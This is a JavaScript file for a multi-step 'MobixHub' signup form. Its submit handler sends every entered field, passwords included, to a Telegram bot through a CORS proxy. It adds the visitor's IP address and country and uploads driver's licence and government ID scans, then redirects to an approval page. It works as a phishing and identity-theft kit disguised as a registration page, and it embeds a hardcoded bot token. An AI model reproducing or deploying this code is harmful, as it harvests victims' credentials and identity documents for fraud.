const steps = document.querySelectorAll(".form-step");

function nextStep(current) {
  if (validateStep(current)) {
    steps[current - 1].classList.remove("active");
    steps[current].classList.add("active");
  }
}

function prevStep(current) {
  steps[current - 1].classList.remove("active");
  steps[current - 2].classList.add("active");
}

function validateStep(stepNum) {
  const step = document.getElementById(`step-${stepNum}`);
  const inputs = step.querySelectorAll("input, select");
  for (let input of inputs) {
    if (!input.checkValidity()) {
      input.reportValidity();
      return false;
    }
  }

  if (stepNum === 1) {
    const pw = step.querySelector("input[name='password']");
    const cpw = step.querySelector("input[name='confirmPassword']");
    if (pw && cpw && pw.value !== cpw.value) {
      alert("Passwords do not match.");
      return false;
    }
  }

  return true;
}

document.getElementById("multiStepForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const statusMsg = document.getElementById("statusMessage");
  statusMsg.style.color = "#007bff";
  statusMsg.textContent = "Loading... Please wait.";

  const botToken = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
  const proxy = "https://corsproxy.io/?";
  const form = document.getElementById("multiStepForm");

  const formInputs = form.querySelectorAll("input, select");
  const data = {};
  let fullName = "";

  formInputs.forEach(input => {
    if (input.type !== "file") {
      const label = input.previousElementSibling ? input.previousElementSibling.innerText : input.name;
      const value = input.value.trim();
      if (value !== "") {
        data[label] = value;
        if (input.name === "firstName") fullName += value + " ";
        if (input.name === "lastName") fullName += value;
      }
    }
  });

  const promoInput = document.getElementById("promoInput");
  const promoTyped = promoInput ? promoInput.value.trim() : "";
  const promoURL = new URLSearchParams(window.location.search).get("promo");
  const promoFinal = promoTyped || promoURL;

  const validPromoCodes = (typeof promoList !== "undefined") ? promoList.map(p => p.code) : [];
  if (!validPromoCodes.includes(promoFinal)) {
    statusMsg.style.color = "red";
    statusMsg.textContent = "❌ Invalid or unauthorized promo code.";
    return;
  }

  if (promoFinal) {
    data["Promo Code"] = promoFinal;
  }

  const chatId = promoFinal;
  let message = "📝 *New MobixHub Signup Request*\n\n";
  for (const [label, value] of Object.entries(data)) {
    message += `*${label}:* ${value}\n`;
  }

  // Run IP fetch and Telegram message send in parallel
  const ipPromise = fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => null);
  const messageSend = fetch(proxy + `https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    })
  }).then(res => res.json());

  Promise.all([ipPromise, messageSend])
    .then(async ([ipData, response]) => {
      if (!response.ok) {
        statusMsg.style.color = "red";
        statusMsg.textContent = "❌ Text submission failed.";
        return;
      }

      if (ipData) {
        const ip = ipData.ip || "N/A";
        const country = ipData.country_name || "Unknown";
        message += `\n🌐 *IP Address:* ${ip}\n🏳️ *Country:* ${country}\n`;
      }

      const fileLabels = [
        "Driver's License (Front)",
        "Driver's License (Back)",
        "Government ID (Front)",
        "Government ID (Back)"
      ];
      const fileInputs = Array.from(document.querySelectorAll("input[type='file']"));
      const MAX_SIZE_MB = 20;

      const uploadFile = (file, label) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("caption", `${fullName.trim()} - ${label}`);
        formData.append("document", file);

        return fetch(proxy + `https://api.telegram.org/bot${botToken}/sendDocument`, {
          method: "POST",
          body: formData
        }).then(r => r.json());
      };

      for (let i = 0; i < fileInputs.length; i++) {
        const file = fileInputs[i].files[0];
        if (file) {
          if (file.size > MAX_SIZE_MB * 1024 * 1024) {
            alert(`❌ ${fileLabels[i]} is too large. Max ${MAX_SIZE_MB}MB.`);
            continue;
          }
          statusMsg.textContent = `📤 please wait a moment...`;
          await uploadFile(file, fileLabels[i]);
        }
      }

      statusMsg.style.color = "green";
      statusMsg.textContent = "✅ Redirecting...";
      setTimeout(() => {
        window.location.href = `approve_acc.html?promo=${promoFinal}`;
      }, 1500);
    })
    .catch(error => {
      console.error("Error:", error);
      statusMsg.style.color = "red";
      statusMsg.textContent = "❌ Network error or failed to get IP.";
    });
});